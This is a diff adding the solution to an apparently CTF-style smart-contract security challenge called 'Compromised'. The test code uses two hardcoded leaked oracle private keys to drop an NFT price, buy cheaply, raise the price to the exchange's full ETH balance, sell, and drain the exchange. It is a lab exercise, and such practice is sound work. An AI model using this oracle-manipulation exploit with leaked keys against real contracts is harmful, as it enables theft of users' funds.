@@ -51,8 +51,28 @@ describe('Compromised challenge', function () {
         expect(await nftToken.rolesOf(exchange.address)).to.eq(await nftToken.MINTER_ROLE());
     });
 
+
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Get private keys and make them oracle wallets
+        // hex64 -> utf8 -> 32 hex -> private keys from leaked webby site :)
+        const oracle1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider)
+        const oracle2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider)
+
+        await oracle.connect(oracle1).postPrice('DVNFT', 0);
+        await oracle.connect(oracle2).postPrice('DVNFT', 0);
+
+        await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.0000001") });
+
+        await oracle.connect(oracle1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(oracle2).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+
+        await oracle.connect(oracle1).postPrice('DVNFT', INITIAL_NFT_PRICE);
+        await oracle.connect(oracle2).postPrice('DVNFT', INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
